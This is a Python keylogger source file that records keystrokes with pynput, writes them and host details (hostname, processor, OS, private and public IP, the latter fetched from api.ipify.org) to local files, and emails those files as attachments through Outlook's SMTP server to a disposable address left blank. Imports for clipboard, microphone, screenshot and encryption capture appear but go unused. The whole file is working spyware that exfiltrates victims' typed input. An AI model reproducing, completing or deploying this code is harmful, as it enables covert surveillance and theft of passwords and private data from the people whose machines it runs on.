#Libraries 

import smtplib 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import socket
import platform

#for Clipboards 
import win32clipboard

#for key logging 
from pynput.keyboard import Key,Listener

import time
import os

#for microphone and sound 
from scipy.io.wavfile import write
import sounddevice as sd 

#encrypt our file 
from cryptography.fernet import Fernet

#to get pass 
import getpass
from requests import get

#screenshot 
from multiprocessing import process, freeze_support
from PIL import ImageGrab



#keylogger
keys_information = "key_log.txt"
system_information = "systeminfo.txt"


#mailing
email_address = ""  #desposible email add
password = "" #its password
toaddr = "" #desposible email to which we will send our file

#file path
file_path= ""#put path here where you want to create the file with adding \\
extend = "\\"


#keylogger 

count =0
keys = []

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count +=1

    if count>=1:
        count = 0
        write_file(keys)
        keys=[]

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f: 
        for key in keys:
            k=str(key).replace("'","")
            if k.find('space')>0:
                f.write('\n')
                f.close()
            elif k.find("Key")==-1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()


#mailing service 

def send_email(filenames, attachments, toaddr):

    fromaddr = email_address
    
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Log File'

    body ="body_of_email"

    msg.attach(MIMEText(body,'plain'))

    for filename, attachment in zip(filenames, attachments):

        p= MIMEBase('application', 'octet-stream')
        p.set_payload(open(attachment, 'rb').read())#rb- 'rb' mode ensures that the file is read in binary mode, 
                                                    #preserving the binary content without any automatic decoding or newline character conversion.

        encoders.encode_base64(p) #This encoding is necessary when dealing with binary data in email attachments,
                              #as email systems generally expect textual data
        p.add_header('content-Disposition',f"attachment; filename= {filename}")
        msg.attach(p)

    s=smtplib.SMTP('smtp-mail.outlook.com',587) #smtp server and port of the service  that you are using 

    s.starttls() #Initiates a TLS (Transport Layer Security) connection to the SMTP server.
    s.login(fromaddr,password)
    text = msg.as_string() # Converts the entire email message into a string format.
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


#system_information

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname= socket.gethostname()
        IPAdder = socket.gethostbyname(hostname)

        #getting Public ip using ipify
        try:
            public_ip = get("http://api.ipify.org").text
            f.write("Public Ip Address:"+ public_ip)
        
        except Exception:
            f.write("couldn't find public ip (max query)")
        
        f.write("\nProcessor:" + (platform.processor()) + "\n")
        f.write("System :" + platform.system() + " "+ platform.version() + '\n')
        f.write("Machine:" + platform.machine() + "\n")
        f.write("hostname:" + hostname +"\n")
        f.write("Private IP Addess:" + IPAdder + "\n")

computer_information()


filenames =[keys_information,system_information]
attachments = [file_path+extend+keys_information , file_path+extend+system_information]
send_email(filenames,attachments,toaddr)